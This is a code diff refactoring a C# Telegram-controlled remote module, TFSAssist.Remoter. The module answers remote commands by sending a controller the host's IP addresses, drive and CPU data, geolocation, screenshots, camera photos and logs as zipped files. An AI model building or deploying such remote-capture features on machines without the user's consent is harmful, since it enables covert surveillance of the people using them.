@@ -1,20 +1,15 @@
 ﻿using System;
 using System.Collections.Generic;
-using System.Device.Location;
-using System.Diagnostics;
 using System.IO;
 using System.IO.Compression;
 using System.Linq;
-using System.Net;
 using System.Net.Sockets;
-using System.Reflection;
 using System.Text;
 using System.Threading;
 using System.Threading.Tasks;
 using Microsoft.Win32;
 using TeleSharp.TL;
 using Utils;
-using Utils.AppUpdater;
 using Utils.Handles;
 using Utils.Telegram;
 
@@ -31,18 +26,12 @@ namespace TFSAssist.Remoter
         private readonly StringBuilder _processingErrorLogs;
 
         private MediaPack _mediaPack;
+        private SystemInfo _systemInfo;
 
-        private GeoCoordinateWatcher _watcher;
-        private string _locationResult = string.Empty;
-        private bool _tryGetLocation = false;
-
-        //private readonly Action _checkUpdates;
-        //private readonly Action _restartApplication;
-        //private readonly Func<string> _getLogs;
         private readonly Func<string, string> _callParent;
 
-        private string _tempDir = string.Empty;
 
+        private string _tempDir = string.Empty;
         public string TempDirectory
         {
             get
@@ -84,22 +73,25 @@ namespace TFSAssist.Remoter
 
         public async Task<bool> Initialize()
         {
-            InitGeoWatcher();
             InitTempDirectory(TempDirectory);
             await InitTempSession();
 
             // только после InitTempDirectory
             _mediaPack = new MediaPack(MainThread, TempDirectory);
-            _mediaPack.OnCompleted += _mediaPack_OnCompleted;
-            _mediaPack.ProcessingExceptions += _mediaPack_ProcessingExceptions;
+            _mediaPack.OnCompleted += MediaPack_OnCompleted;
+            _mediaPack.OnProcessingExceptions += ProcessingExceptions;
             _mediaPack.Initialize();
+
+            _systemInfo = new SystemInfo();
+            _systemInfo.OnProcessingExceptions += ProcessingExceptions;
+            _systemInfo.Initialize();
 
             await Connect(GetAuthCode);
 
             if (IsEnabled)
             {
                 Thread.Sleep(5000);
-                SendMessageToUserHost($"Connected. {GetCurrentServerInfo()}");
+                SendMessageToUserHost($"Connected. {_systemInfo.GetHostInfo()}");
                 Thread.Sleep(1000);
             }
 
@@ -184,7 +176,7 @@ namespace TFSAssist.Remoter
             }
         }
 
-        async Task<string> GetAuthCode()
+        static async Task<string> GetAuthCode()
         {
             // ждем когда появится локальный файл с кодом для новой авторизации
             string result = string.Empty;
@@ -211,7 +203,7 @@ namespace TFSAssist.Remoter
         /// </summary>
         /// <param name="fileDestination"></param>
         /// <returns></returns>
-        async Task<string> DecryptFileData(string fileDestination)
+        static async Task<string> DecryptFileData(string fileDestination)
         {
             string result;
             using (var stream = new StreamReader(fileDestination))
@@ -222,9 +214,6 @@ namespace TFSAssist.Remoter
 
             return result;
         }
-
-
-        
 
         public async Task Run()
         {
@@ -247,7 +236,7 @@ namespace TFSAssist.Remoter
                     TLMessage lastMessage = newMessages?.LastOrDefault();
                     if (lastMessage != null)
                     {
-                        await ReadCommands(newMessages, TempDirectory);
+                        await ReadCommands(newMessages);
                         lastDate = TLControl.ToDate(lastMessage.Date);
                     }
                 }
@@ -265,7 +254,7 @@ namespace TFSAssist.Remoter
                     }
 
                     if (isReconnected)
-                        SendMessageToUserHost($"Reconnected. {GetCurrentServerInfo()}");
+                        SendMessageToUserHost($"Reconnected. {_systemInfo.GetHostInfo()}");
                     else
                         WriteExLog(ex);
                 }
@@ -299,7 +288,7 @@ namespace TFSAssist.Remoter
             }
         }
 
-        void SendZipFileToUserHost(string destinationPath)
+        void SendBigFileToUserHost(string destinationFile)
         {
             if (!IsEnabled)
                 return;
@@ -309,14 +298,8 @@ namespace TFSAssist.Remoter
                 //await _control.SendBigFileAsync(_control.CurrentUser.Destination, destinationPath);
                 lock (syncSession)
                 {
-                    string destinationZip = DoZipFile(destinationPath);
-                    if (destinationZip != null && File.Exists(destinationZip))
-                    {
-                        Task task = _control.SendBigFileAsync(_control.UserHost.Destination, destinationZip);
-                        task.Wait(); // таймаут ставить нельзя т.к. может интеренет тормознутый и надо дождаться до конца
-
-                        File.Delete(destinationZip);
-                    }
+                    Task task = _control.SendBigFileAsync(_control.UserHost.Destination, destinationFile, Path.GetFileName(destinationFile));
+                    task.Wait(); // таймаут ставить нельзя т.к. может интеренет тормознутый и надо дождаться до конца
                 }
             }
             catch (Exception ex)
@@ -330,8 +313,10 @@ namespace TFSAssist.Remoter
             }
         }
 
-        async Task ReadCommands(List<TLMessage> newMessages, string projectDirPath)
+        async Task ReadCommands(List<TLMessage> newMessages)
         {
+            List<string> preparedFiles = new List<string>();
+
             bool isUpdate = false;
             bool isRestart = false;
             string isCommand = ClientID + ":";
@@ -361,116 +346,33 @@ namespace TFSAssist.Remoter
 
                         switch (command)
                         {
-                            case RemoteControlCommands.PING:
-                                SendMessageToUserHost("PONG. " + GetCurrentServerInfo());
-                                break;
-
                             case RemoteControlCommands.COMMANDS:
                                 SendMessageToUserHost(string.Join("\r\n", Enum.GetNames(typeof(RemoteControlCommands))));
                                 break;
 
+                            case RemoteControlCommands.PING:
+                                SendMessageToUserHost($"PONG. {_systemInfo.GetHostInfo()}");
+                                break;
+
                             case RemoteControlCommands.INFO:
-                                StringBuilder detInfo = new StringBuilder();
-
-                                var hostIps = HOST.GetIPAddresses();
-                                int maxLenghtSpace = hostIps.Aggregate("", (max, cur) => max.Length > cur.Interface.Name.Length ? max : cur.Interface.Name).Length + 3;
-
-                                foreach (var address in hostIps)
-                                {
-                                    detInfo.Append($"{address.Interface.Name} {new string('.', maxLenghtSpace - address.Interface.Name.Length)} [{address.IPAddress.Address}] ({address.Interface.Description})\r\n");
-                                }
-
-                                string whiteSpace = "=";
-                                if (maxLenghtSpace > 10)
-                                    whiteSpace = " " + new string('.', maxLenghtSpace - 10) + " ";
-
-                                detInfo.Append($"ExternalIP{whiteSpace}[{HOST.GetExternalIPAddress()}]\r\n");
-
-
-                                var det = HOST.GetDetailedHostInfo();
-                                if (det?.Count > 0)
-                                {
-                                    detInfo.Append($"\r\nDetailed:\r\n");
-                                    maxLenghtSpace = det.Keys.Aggregate("", (max, cur) => max.Length > cur.Length ? max : cur).Length + 3;
-
-                                    foreach (var value in det)
-                                    {
-                                        detInfo.Append($"{value.Key} {new string('.', maxLenghtSpace - value.Key.Length)} [{string.Join("];[", value.Value)}]\r\n");
-                                    }
-
-                                    // должен быть именно GetEntryAssembly вместо GetExecutingAssembly. Т.к. GetExecutingAssembly смотрит исполняемую библиотеку, а не испольняемый exe файл
-                                    Dictionary<string, FileBuildInfo> localVersions = BuildPackInfo.GetLocalVersions(Assembly.GetEntryAssembly());
-                                    if (localVersions?.Count > 0)
-                                    {
-                                        maxLenghtSpace = localVersions.Keys.Aggregate("", (max, cur) => max.Length > cur.Length ? max : cur).Length + 3;
-                                        localVersions = localVersions.OrderBy(p => p.Key).ToDictionary(x => x.Key, x => x.Value);
-
-                                        detInfo.Append($"\r\nLocation=[{Assembly.GetEntryAssembly().GetDirectory()}]\r\n");
-                                        foreach (var versionLocalFiles in localVersions)
-                                        {
-                                            detInfo.Append($"{versionLocalFiles.Key} {new string('.', maxLenghtSpace - versionLocalFiles.Key.Length)} [{versionLocalFiles.Value.Version}]\r\n");
-                                        }
-                                    }
-                                }
-
-                                detInfo.Append($"\r\nTempDir=[{TempDirectory}]\r\n");
-                                DirectoryInfo tempDir = new DirectoryInfo(TempDirectory);
-                                FileInfo[] tempFilesCollection = tempDir.GetFiles("*", SearchOption.AllDirectories);
-                                if (tempFilesCollection.Any())
-                                {
-                                    foreach (var tempFile in tempFilesCollection)
-                                    {
-                                        detInfo.Append($"{tempFile.FullName}\r\n");
-                                    }
-                                }
-
-
-                                await SaveFile(Path.Combine(projectDirPath, $"{STRING.RandomString(15)}.log"), detInfo.ToString());
-
+                                var detInfo = _systemInfo.GetDetailedHostInfo(new [] {TempDirectory});
+                                var fileInfo = Path.Combine(TempDirectory, $"{STRING.RandomString(15)}.txt");
+                                await SaveFile(fileInfo, detInfo);
+                                preparedFiles.Add(fileInfo);
                                 break;
 
                             case RemoteControlCommands.DRIVE:
-                                var drives = DriveInfo.GetDrives();
-                                if (drives == null || drives.Length == 0)
-                                    break;
-
-                                string result = string.Empty;
-                                foreach (DriveInfo drive in drives)
-                                {
-                                    if (drive.IsReady)
-                                    {
-                                        result += $"Drive=[{drive.Name}] TotalSize=[{IO.FormatBytes(drive.TotalSize, out _)}] FreeSize=[{IO.FormatBytes(drive.TotalFreeSpace, out _)}]\r\n";
-                                    }
-                                }
-
-                                SendMessageToUserHost(result);
+                                var drivesInfo = _systemInfo.GetDrivesInfo();
+                                if (drivesInfo != null)
+                                    SendMessageToUserHost(drivesInfo);
                                 break;
 
                             case RemoteControlCommands.CPU:
-                                Process proc = Process.GetCurrentProcess();
-
-                                var totalCPU = (int)SERVER.GetCpuUsage();
-                                var totalMem = SERVER.GetTotalMemoryInMiB();
-                                var avalMem = SERVER.GetPhysicalAvailableMemoryInMiB();
-
-                                var appCPUUsage = (int)SERVER.GetCpuUsage(proc);
-                                string appMemUsage = SERVER.GetMemUsage(proc).ToFileSize();
-
-                                SendMessageToUserHost($"CPU=[{appCPUUsage}%] Mem=[{appMemUsage}] TotalCPU=[{totalCPU}%] TotalMem=[{totalMem} MB] FreeMem=[{avalMem} MB]");
-
+                                SendMessageToUserHost(_systemInfo.GetDiagnosticInfo());
                                 break;
 
                             case RemoteControlCommands.LOC:
-                                if (_locationResult.IsNullOrEmptyTrim())
-                                {
-                                    SendMessageToUserHost("Location unknown.");
-                                    _tryGetLocation = true;
-                                }
-                                else
-                                {
-                                    SendMessageToUserHost(_locationResult);
-                                    _tryGetLocation = false;
-                                }
+                                SendMessageToUserHost(_systemInfo.GetLocationInfo());
                                 break;
 
                             case RemoteControlCommands.MEDIA:
@@ -546,16 +448,16 @@ namespace TFSAssist.Remoter
                                 break;
 
                             case RemoteControlCommands.SCREEN:
-                                _mediaPack.GetScreen();
+                                string screenPath = Path.Combine(TempDirectory, $"{STRING.RandomString(15)}.png");
+                                if(_mediaPack.GetScreen(screenPath))
+                                    preparedFiles.Add(screenPath);
                                 break;
 
                             case RemoteControlCommands.PHOTO:
-                                _mediaPack.GetPhoto();
+                                string photoPath = Path.Combine(TempDirectory, $"{STRING.RandomString(15)}.png");
+                                if(_mediaPack.GetPhoto(photoPath))
+                                    preparedFiles.Add(photoPath);
                                 break;
-
-                            //case RemoteControlCommands.KILL:
-                            //    Terminate();
-                            //    break;
 
                             case RemoteControlCommands.LOG:
                                 string entireLogs = _callParent?.Invoke(RemoteControlCommands.LOG.ToString("G"));
@@ -581,7 +483,9 @@ namespace TFSAssist.Remoter
                                     break;
                                 }
 
-                                await SaveFile(Path.Combine(projectDirPath, $"{STRING.RandomString(15)}.log"), entireLogs);
+                                var fileLog = Path.Combine(TempDirectory, $"{STRING.RandomString(15)}.txt");
+                                await SaveFile(fileLog, entireLogs);
+                                preparedFiles.Add(fileLog);
                                 break;
 
                             case RemoteControlCommands.UPDATE:
@@ -592,6 +496,10 @@ namespace TFSAssist.Remoter
                                 isRestart = true;
                                 break;
 
+                            case RemoteControlCommands.CLEAR:
+                                DeleteAllFilesInDirectory(TempDirectory);
+                                break;
+
                             default:
                                 string parentResult = _callParent?.Invoke(command.ToString("G"));
                                 if (!parentResult.IsNullOrEmptyTrim())
@@ -599,7 +507,11 @@ namespace TFSAssist.Remoter
                                     if(parentResult.Length <= 800)
                                         SendMessageToUserHost(parentResult);
                                     else
-                                        await SaveFile(Path.Combine(projectDirPath, $"{STRING.RandomString(15)}.log"), parentResult);
+                                    {
+                                        var fileResult = Path.Combine(TempDirectory, $"{STRING.RandomString(15)}.txt");
+                                        await SaveFile(fileResult, parentResult);
+                                        preparedFiles.Add(fileResult);
+                                    }
                                 }
                                 break;
                         }
@@ -612,7 +524,7 @@ namespace TFSAssist.Remoter
                         switch (command)
                         {
                             case RemoteControlCommands.PING:
-                                SendMessageToUserHost("PONG. " + GetCurrentServerInfo());
+                                SendMessageToUserHost($"PONG. {_systemInfo.GetHostInfo()}");
                                 break;
                             
                             case RemoteControlCommands.UPDATE:
@@ -621,6 +533,10 @@ namespace TFSAssist.Remoter
 
                             case RemoteControlCommands.RESTART:
                                 isRestart = true;
+                                break;
+
+                            case RemoteControlCommands.CLEAR:
+                                DeleteAllFilesInDirectory(TempDirectory);
                                 break;
                         }
                     }
@@ -632,7 +548,7 @@ namespace TFSAssist.Remoter
             }
             finally
             {
-                PackAndSendFiles(projectDirPath);
+                PackAndSendFiles(preparedFiles);
 
                 // выполняется всегда в конце после обработки других комманд, если они были
                 try
@@ -652,28 +568,6 @@ namespace TFSAssist.Remoter
                 }
             }
         }
-
-
-        void PackAndSendFiles(string projectDirPath)
-        {
-            var tempFiles = Directory.EnumerateFiles(projectDirPath, "*", SearchOption.AllDirectories);
-
-            if (tempFiles.Any())
-            {
-                try
-                {
-                    SendZipFileToUserHost(projectDirPath);
-                }
-                catch (Exception ex)
-                {
-                    GC.Collect();
-                    WriteExLog(ex);
-                }
-            }
-
-            DeleteAllFilesInDirectory(projectDirPath);
-        }
-
 
 
         static Dictionary<string, string> ReadOptionParams(string options)
@@ -742,16 +636,67 @@ namespace TFSAssist.Remoter
             }
         }
 
-        string DoZipFile(string sourceDir)
+        readonly object syncZip = new object();
+
+        void PackAndSendFiles(List<string> filesDestinations)
+        {
+            if (filesDestinations == null || filesDestinations.Count == 0)
+                return;
+
+            try
+            {
+                if (filesDestinations.Count == 1)
+                {
+                    var singleFile = new FileInfo(filesDestinations.First());
+                    if (singleFile.Exists && IsFileReady(singleFile.FullName))
+                    {
+                        if (singleFile.Length.ToMegabytes() <= 15) // если файл не больше 15 мб
+                        {
+                            SendBigFileToUserHost(singleFile.FullName);
+                            singleFile.Delete();
+                            return;
+                        }
+                    }
+                    else
+                    {
+                        return;
+                    }
+                }
+
+                lock (syncZip)
+                {
+                    var destinationZipFile = DoZipFile(filesDestinations);
+                    if (destinationZipFile != null)
+                    {
+                        SendBigFileToUserHost(destinationZipFile);
+                        File.Delete(destinationZipFile);
+                    }
+
+                    foreach (string fileSource in filesDestinations)
+                    {
+                        try
+                        {
+                            File.Delete(fileSource);
+                        }
+                        catch (Exception ex)
+                        {
+                            WriteExLog(ex);
+                        }
+                    }
+                }
+            }
+            catch (Exception ex)
+            {
+                GC.Collect();
+                WriteExLog(ex);
+            }
+        }
+
+        string DoZipFile(List<string> filesDestinations)
         {
             try
             {
-                DirectoryInfo d = new DirectoryInfo(sourceDir);
-                FileInfo[] Files = d.GetFiles("*", SearchOption.AllDirectories);
-                if (!Files.Any())
-                    return null;
-
-                string destinationZip = Path.Combine(sourceDir, STRING.RandomStringNumbers(15) + ".zip");
+                string destinationZip = Path.Combine(TempDirectory, STRING.RandomStringNumbers(15) + ".zip");
                 string packFileTempPath = Path.GetTempFileName();
                 File.Delete(packFileTempPath);
 
@@ -760,14 +705,14 @@ namespace TFSAssist.Remoter
                 {
                     using (ZipArchive archive = new ZipArchive(zipToOpen, ZipArchiveMode.Create))
                     {
-                        foreach (FileInfo file in Files)
+                        foreach (string filePath in filesDestinations)
                         {
-                            if (IO.IsFileReady(file.FullName))
-                            {
-                                string destArchPth = file.FullName.Replace(sourceDir, "").Trim('\\');
-                                archive.CreateEntryFromFile(file.FullName, destArchPth);
-                                compressedFiles++;
-                            }
+                            if (!File.Exists(filePath) || !IsFileReady(filePath))
+                                continue;
+
+                            string destArchPth = filePath.Replace(TempDirectory, "").Trim('\\');
+                            archive.CreateEntryFromFile(filePath, destArchPth);
+                            compressedFiles++;
                         }
                     }
                 }
@@ -785,56 +730,23 @@ namespace TFSAssist.Remoter
                 File.Delete(packFileTempPath);
                 return destinationZip;
             }
-            catch (Exception)
+            catch (Exception ex)
             {
+                WriteExLog(ex);
                 return null;
             }
         }
 
-        string GetCurrentServerInfo()
+        static bool IsFileReady(string file)
         {
-            try
+            int numberTryes = 0;
+            while (!IO.IsFileReady(file) && numberTryes <= 5)
             {
-                //return $"Host=[{Dns.GetHostName()}] Thread=[{(MainThread.IsAlive ? MainThread.ManagedThreadId.ToString() : "Aborted")}]";
-                return $"Host=[{Dns.GetHostName()}]{(!MainThread.IsAlive ? " Thread=[Aborted]" : string.Empty)}";
+                numberTryes++;
+                Thread.Sleep(1000);
             }
-            catch (Exception)
-            {
-                return string.Empty;
-            }
-        }
 
-
-        void InitGeoWatcher()
-        {
-            try
-            {
-                _watcher = new GeoCoordinateWatcher();
-                _watcher.StatusChanged += Watcher_StatusChanged;
-                _watcher.Start();
-            }
-            catch (Exception ex)
-            {
-                WriteExLog(ex, false);
-            }
-        }
-
-        private void Watcher_StatusChanged(object sender, GeoPositionStatusChangedEventArgs e)
-        {
-            if (e.Status != GeoPositionStatus.Ready)
-                return;
-
-            if (_watcher.Position.Location.IsUnknown)
-                return;
-
-            GeoCoordinate coordinate = _watcher.Position.Location;
-            _locationResult = $"Latitude=[{coordinate.Latitude.ToString().Replace(",", ".")}] Longitude=[{coordinate.Longitude.ToString().Replace(",", ".")}]";
-
-            if (_tryGetLocation)
-            {
-                SendMessageToUserHost(_locationResult);
-                _tryGetLocation = false;
-            }
+            return numberTryes <= 5;
         }
 
 
@@ -895,12 +807,12 @@ namespace TFSAssist.Remoter
             try
             {
                 var tempFiles = Directory.EnumerateFiles(dirPath, "*", SearchOption.AllDirectories);
-                foreach (var fileName in tempFiles)
+                foreach (var filePath in tempFiles)
                 {
-                    if (!IO.IsFileReady(fileName))
+                    if (!IsFileReady(filePath))
                         continue;
 
-                    var fileInfo = new FileInfo(fileName)
+                    var fileInfo = new FileInfo(filePath)
                     {
                         Attributes = FileAttributes.Normal
                     };
@@ -940,12 +852,12 @@ namespace TFSAssist.Remoter
             }
         }
 
-        private void _mediaPack_OnCompleted(object sender, string destinationFile)
+        private void MediaPack_OnCompleted(object sender, string[] fileDestinations)
         {
-            PackAndSendFiles(destinationFile);
+            PackAndSendFiles(fileDestinations.ToList());
         }
 
-        private void _mediaPack_ProcessingExceptions(string log)
+        private void ProcessingExceptions(string log)
         {
             WriteExLog(log);
         }
@@ -997,7 +909,9 @@ namespace TFSAssist.Remoter
                 {
                     _control?.Dispose();
                 }
-                _watcher?.Stop();
+                _mediaPack?.Dispose();
+                _systemInfo?.Dispose();
+
                 DeleteAllFilesInDirectory(TempDirectory);
             }
             catch (Exception)
